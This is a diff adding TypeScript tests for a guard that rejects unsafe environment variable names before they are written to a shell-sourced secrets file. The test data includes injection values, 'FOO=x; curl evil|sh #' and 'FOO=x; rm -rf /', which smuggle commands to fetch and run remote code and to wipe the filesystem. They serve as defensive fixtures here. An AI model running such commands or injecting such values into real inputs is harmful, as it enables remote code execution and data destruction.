@@ -11,6 +11,8 @@ import { afterEach, beforeEach, describe, expect, test } from "bun:test";
 import { chmodSync, existsSync, mkdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import {
+  isSafeEnvVarName,
+  removeKeyFromSecretsEnv,
   secretsEnvHasKey,
   secretsEnvPath,
   unquoteSecretsValue,
@@ -20,6 +22,25 @@ import {
 function tag(): string {
   return `${process.pid}-${Math.floor(Math.random() * 1_000_000)}`;
 }
+
+describe("env var name guard", () => {
+  test("accepts plain identifiers, rejects shell/regex-injection names", () => {
+    expect(isSafeEnvVarName("ANTHROPIC_API_KEY")).toBe(true);
+    expect(isSafeEnvVarName("_X1")).toBe(true);
+    expect(isSafeEnvVarName("FOO=x; curl evil|sh #")).toBe(false);
+    expect(isSafeEnvVarName("BAD NAME")).toBe(false);
+    expect(isSafeEnvVarName("LINE\nINJECT")).toBe(false);
+    expect(isSafeEnvVarName("1LEADING")).toBe(false);
+    expect(isSafeEnvVarName("")).toBe(false);
+  });
+
+  test("write throws on an unsafe name (never reaches the shell-sourced file); remove/has no-op", () => {
+    // Throws before touching the filesystem, so no scratch HOME is needed.
+    expect(() => writeKeyToSecretsEnv("FOO=x; rm -rf /", "v")).toThrow(/unsafe env var name/);
+    expect(removeKeyFromSecretsEnv("BAD NAME")).toBe(false);
+    expect(secretsEnvHasKey("BAD NAME")).toBe(false);
+  });
+});
 
 describe("writeKeyToSecretsEnv", () => {
   let scratchHome: string;
